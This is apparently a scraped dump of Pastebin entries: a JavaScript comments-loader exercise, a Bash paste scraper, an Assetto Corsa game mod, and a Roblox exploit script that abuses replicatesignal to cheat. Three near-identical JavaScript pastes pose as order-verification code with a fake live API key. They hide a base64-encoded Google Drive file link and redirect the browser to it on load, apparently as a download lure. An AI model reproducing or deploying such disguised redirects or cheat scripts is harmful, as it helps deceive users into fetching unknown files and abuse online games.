        option.value = key;

        selectPost.appendChild(option);
    }
}

async function onViewPost(url) {
    let post = document.getElementById('posts');
    let postComments;
    let postData;

    try {
        const [postResponse, commentsResponse] = await Promise.all([
            fetch('http://localhost:3030/jsonstore/blog/posts'),
            fetch(url)
        ]);

        postData = await postResponse.json();

        let commentsData = await commentsResponse.json();
        postComments = Object.values(commentsData).filter(comment => comment.postId === post.value);
    } catch {
        return;
    }

    // Fetch-вах поста с URL-а + post.value и после долните две ги сетвах
    // с postData.title и postData.body. При мен се показваше правилно,
    // 3ти и 4ти тест не минаваха.

    document.getElementById('post-title').textContent = post.selectedOptions[0].textContent;
    document.getElementById('post-body').textContent = postData[post.value].body;
    
    let comments = document.getElementById('post-comments');
    comments.replaceChildren();

    for (let comment of postComments) {
        let li = document.createElement('li');
        li.textContent = comment.text;
        li.id = comment.id;

        comments.appendChild(li);
    }
}   

attachEvents();"
vzfwvuSK,Untitled,kammex,JavaScript,Thursday 3rd of April 2025 10:26:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/095/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wRxDmfyb,replicatesignal_commands-01,Dark_Agent,Lua,Thursday 3rd of April 2025 09:57:56 AM CDT,"if getgenv then
    MS = getgenv()
elseif shared then
    MS = shared
elseif _G then
    MS = _G
else
    warn(""Your exec does not support these features: getgenv, shared, _G!"")
    return
end

MS.pd = function()
    if replicatesignal then
        replicatesignal(game.Players.LocalPlayer.ConnectDiedSignalBackend)
    else
        warn(""replicatesignal not supported 💥"")
    end
    wait(game.Players.RespawnTime + 0.1)
    game.Players.LocalPlayer.Character:FindFirstChildOfClass(""Humanoid""):ChangeState(15)
end

MS.nopd = function()
    replicatesignal(game.Players.LocalPlayer.ConnectDiedSignalBackend)
end

MS.instantre = function()
    h = game.Players.LocalPlayer.Character.HumanoidRootPart
    cam = workspace.CurrentCamera
    if replicatesignal then
        replicatesignal(game.Players.LocalPlayer.ConnectDiedSignalBackend)
    else
        warn(""Can't do InstantRespawn because replicatesignal function not supported"")
    end
    wait(game.Players.RespawnTime - 0.165)
    game.Players.LocalPlayer.Character:FindFirstChildOfClass(""Humanoid""):ChangeState(15)
    wait(0.5)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = h.CFrame
    workspace.CurrentCamera = cam
end

MS.breakjoints = function()
    replicatesignal(game.Players.LocalPlayer.Character.Humanoid.ServerBreakJoints)
end

wait(0.5) --wait 0.5s
print("" ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ "")
print("" "")
print(""Commands: breakjoints(), instantre(), nopd(), pd()"")
print("" "")
print("" ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ "")
"
2V0F9CcS,Scraping Pastes,metalx1000,Bash,Thursday 3rd of April 2025 09:37:47 AM CDT,"#!/bin/bash
######################################################################
#Copyright (C) 2025  Kris Occhipinti
#https://filmsbykris.com

#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation version 3 of the License.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
######################################################################
domain=""http://pastebin.com""
user=""metalx1000""
url=""${domain}/u/${user}""

wget -qO- ""$url"" | grep -A 1 ""Public paste"" | grep href | sed ""s|<a href=\""|$domain|g;s/\"">/|/g;s|</a>    </td>||g""
"
RPRA0JPM,Untitled,dentira,JavaScript,Thursday 3rd of April 2025 09:08:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/859/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GbeUrXB5,police,supinus,Lua,Thursday 3rd of April 2025 09:00:53 AM CDT,"-- cops_vs_robbers.lua
-- Place this file inside: assettocorsa/server/extension/lua/

local cops = {}
local robbers = {}
local busted = {}

-- Menu d'équipe
function script.update(dt)
    for i = 0, ac.getCarCount() - 1 do
        local car = ac.getCar(i)
        if not cops[i] and not robbers[i] then
            ui.begin(""Choisissez votre équipe"", true, WindowFlags.AlwaysAutoResize)
            ui.text(""Vous êtes : "" .. car.name)
            if ui.button(""🚓 Rejoindre les flics"") then
                cops[i] = true
                ac.setCarNameTag(i, ""🚓 Police"")
            end
            if ui.button(""💨 Rejoindre les fuyards"") then
                robbers[i] = true
                ac.setCarNameTag(i, ""💨 Fuyard"")
            end
            ui.endWindow()
        end
    end

    -- Vérifier collisions
    for i = 0, ac.getCarCount() - 1 do
        if cops[i] then
            local copCar = ac.getCar(i)
            for j = 0, ac.getCarCount() - 1 do
                if robbers[j] and not busted[j] then
                    local robberCar = ac.getCar(j)
                    if copCar:wasInContactWith(j) then
                        busted[j] = true
                        ac.setCarNameTag(j, ""❌ Busté"")
                        ac.sendChatMessage(string.format(""💥 %s a été attrapé par %s!"", robberCar.name, copCar.name))
                    end
                end
            end
        end
    end

    -- Vérifier victoire
    local remaining = 0
    for i = 0, ac.getCarCount() - 1 do
        if robbers[i] and not busted[i] then
            remaining = remaining + 1
        end
    end

    if remaining == 0 and tableLength(robbers) > 0 then
        ac.sendChatMessage(""🚨 Tous les fuyards ont été attrapés ! Victoire des flics !"")
        ac.setSessionOver()
    end
end

function tableLength(t)
    local count = 0
    for _, _ in pairs(t) do count = count + 1 end
    return count
end
"
hBRKM93s,Market.js,Epiphemeral,JavaScript,Thursday 3rd of April 2025 08:52:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/769/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
